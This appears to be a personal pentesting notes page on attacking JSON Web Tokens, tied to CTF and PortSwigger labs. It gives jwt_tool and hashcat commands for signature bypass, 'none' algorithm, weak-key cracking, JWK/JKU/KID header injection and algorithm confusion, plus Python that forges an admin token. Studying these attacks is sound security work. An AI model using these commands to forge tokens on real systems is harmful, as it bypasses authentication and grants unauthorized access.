# JSON Web Token (JWT)

[![hacking_jwt](../../../../_badges/hacktricks/hacking_jwt.svg)](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)
[![json_web_token](../../../../_badges/poat/json_web_token.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)
[![marketplace](../../../../_badges/thm-p/marketplace.svg)](https://tryhackme.com/r/room/marketplace)
[![jwt](../../../../_badges/ps-course/jwt.svg)](https://portswigger.net/web-security/jwt)

<div class="row row-cols-lg-2"><div>

JSON Web Token (JWT) are used to represent signed data. They are commonly used in for authentication and authorization.

The format is: `<algo>.<data>.<signature>`. Each part is base64 encoded, so the final string is URL-safe while it can be easily decoded.

The data is signed using a secret key. If the secret key is compromised, everyone can sign messages 🔏.

The signature is used to detect if data was tampered with.
</div><div>

They can be transferred and found in:

* 📚 Headers (`Authorization: Bearer <JWT>`)
* 🍪 Cookies
* 📄 URL Parameters
* 💼 Request Body
* ...

📚 JWT is a specification, JWS <small>(mostly)</small>/JWE are implementations.
</div></div>

<hr class="sep-both">

## JWT Tools

<div class="row row-cols-lg-2"><div>

#### jwt-tools (Python)

You can use [jwt-tools](https://github.com/ticarpi/jwt_tool) <small>(5.4k ⭐)</small> to attack JWT:

```shell!
$ git clone https://github.com/ticarpi/jwt_tool.git $HOME/tools/jwt_tool
$ chmod +x $HOME/tools/jwt_tool/jwt_tool.py
$ ln -s $HOME/tools/jwt_tool/jwt_tool.py $HOME/.local/bin/jwt_tool
$ jwt_tool -h
```

```ps
$ jwt_tool 'jwt'             # decode
$ jwt_tool 'jwt' -T          # encode
$ jwt_tool 'jwt' -I -pc claim -pv value
```
</div><div>

#### jwt.io (Website)

You can also use [jwt.io](https://jwt.io/).

<br>

#### JWT wordlists

A common handy wordlist is [jwt-secrets](https://github.com/wallarm/jwt-secrets).

```ps
$ wget "https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list"
```
</div></div>

<hr class="sep-both">

## Common JWT Attacks

<div class="row row-cols-lg-2"><div>

#### JWT — Unverified Signature

[![jwt_unverified_signature](../../../../_badges/ps-lab/jwt/jwt_unverified_signature.svg)](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)

It's possible for the signature to not be checked at all by the server.

```ps
$ jwt_tool 'jwt' -I -pc claim -pv value
```

<br>

#### JWT — Null Signature

[![jwt_introduction](../../../../_badges/rootme/web_server/jwt_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Introduction)
[![jwt_flawed_signature_verification](../../../../_badges/ps-lab/jwt/jwt_flawed_signature_verification.svg)](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification)

If the signature algorithm is not verified, you may set it to 'none,' and remove the signature that is not required anymore.

```ps
$ jwt_tool 'jwt' -T -X a     # attack 'algo=none'
```

📚 You can use `none`, `None`, `NONE`, etc.

<br>

#### JWT — Weak Secret Key

[![jwt_weak_secret](../../../../_badges/rootme/web_server/jwt_weak_secret.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Weak-secret)
[![jwt_weak_key](../../../../_badges/ps-lab/jwt/jwt_weak_key.svg)](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key)

The secret key may be weak and brute forced:

```ps
$ jwt_tool 'jwt' -C -d ./jwt.secrets.list # crack key
$ jwt_tool 'jwt' -T -p "key" # use secret key
$ jwt_tool 'jwt' -p "key" -S hs256 -I -pc claim -pv value
```

```ps
$ hashcat -m 16500 hash ./jwt.secrets.list
```

<br>

#### JWT — JWK Header Injection

[![jwt_header_injection](../../../../_badges/rootme/web_server/jwt_header_injection.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Header-Injection)
[![jwt_jwk_injection](../../../../_badges/ps-lab/jwt/jwt_jwk_injection.svg)](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection)

An application may use the `jwk` header to represent the RSA key used to sign the data. We may be able to inject our own RSA key.

```ps
$ jwt_tool 'jwt' -X i -T   # attack 'jwk header injection'
$ jwt_tool 'jwt' -X i -T -hc kid -hv jwt_tool  # with kid
$ jwt_tool 'jwt' -X i -I -hc kid -hv jwt_tool -pc claim -pv value
```
</div><div>

#### JWT — JKU Header Injection

[![jwt_unsecure_key_handling](../../../../_badges/rootme/web_server/jwt_unsecure_key_handling.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-Key-Handling)
[![jwt_jku_injection](../../../../_badges/ps-lab/jwt/jwt_jku_injection.svg)](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)

The `jku` header contains a URL or a filename used to fetch a key.

* When a asymmetric algorithm such as RS is used:

```shell!
$ cat $HOME/.jwt_tool/jwttool_custom_jwks.json # upload to URL as jwks.json
$ jwt_tool -ju "URL/jwks.json" -X s -I -hc kid -hv jwt_tool -pc claim -pv value
```

📚 You may check: `/jwks.json`, `/.well-known/jwks.json`, etc. Refer to [SSRF](/cybersecurity/red-team/s3.exploitation/vulns/web/ssrf.md) for insight <small>(filtering, attacks, etc.)</small> and setting up a [grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md).

<br>

#### JWT — KID Header Injection

[![jwt_header_injection](../../../../_badges/rootme/web_server/jwt_header_injection.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Header-Injection)
[![jwt_unsecure_key_handling](../../../../_badges/rootme/web_server/jwt_unsecure_key_handling.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-Key-Handling)
[![jwt_public_key](../../../../_badges/rootme/web_server/jwt_public_key.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Public-key)
[![jwt_unsecure_file_signature](../../../../_badges/rootme/web_server/jwt_unsecure_file_signature.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-File-Signature)
[![jwt_kid_path_traversal](../../../../_badges/ps-lab/jwt/jwt_kid_path_traversal.svg)](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)

The kid header may be present in two scenarios. The first one is to define which key file contains the secret. The second usage is to determines which of the keys in the `jku` we should use.

```shell!
$ # The file "/dev/null" is empty so -p is ""
$ jwt_tool "" -I -hc kid -hv "/dev/null" -S hs512 -p "" -pc claim -pv value
```

➡️ Refer to [Path Traversal](/cybersecurity/red-team/s3.exploitation/vulns/web/path_traversal.md) and my [cheatsheet](/cybersecurity/red-team/s3.exploitation/vulns/cheatsheet/arbitrary_file_access.md) for more notes.

<br>

#### JWT — Algorithm Confusion Attack

[![jwt_public_key](../../../../_badges/rootme/web_server/jwt_public_key.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Public-key)

When using RS256 algorithm, JWT uses the private key to sign the JWK and the public key to verify integrity. We may be able to perform a downgrade attack to HS256 and only use a public key for both.

```ps
$ jwt_tool 'jwt' -S hs256 -k public.key -T
```

You can compute the public key if you have two messages:

```ps
$ docker run -it ttervoort/jws2pubkey "JWT1" "JWT2"
```
</div></div>

<hr class="sep-both">

## Python JWT

<div class="row row-cols-lg-2"><div>

The [pyjwt](https://github.com/jpadilla/pyjwt) <small>(5.1k ⭐)</small> library can be used to manipulate JWT in Python. There are two unmaintained alternatives which are:

* [python-jwt by GehirnInc](https://github.com/GehirnInc/python-jwt) <small>(0.1k ⭐, 2022 🪦)</small>
* [python-jwt by D. Halls](https://github.com/davedoesdev/python-jwt) <small>(0.2k ⭐, 2023 🪦)</small> — has two CVEs

```py
headers = {
    'kid': '/dev/null'
}
payload = {
    'role': 'admin',
    'iat': int(datetime.datetime.now(datetime.UTC).timestamp())
}
```
</div><div>

To install it:

```shell!
$ pip install pyjwt
```

To generate a JWT:

```py
import jwt
token = jwt.encode(payload, '', algorithm='HS512', headers=headers)
```

To decode a JWT:

```py
import jwt
payload = jwt.decode(token, '', algorithms=['HS512'])
```
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* [PortSwigger JWT](https://portswigger.net/web-security/jwt)
* [jwtcrack/jwt2john](https://github.com/Sjord/jwtcrack)
* `cty` (if you can bypass the signature, to try to change the content type and perform deserialization/XXE attacks)
* `x5c` (refer to related CVEs)
</div><div>

```json!
{
    "kid": "jwt_tool",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "...",
        "kid": "jwt_tool",
        "n": "..."
    }
}
```
</div></div>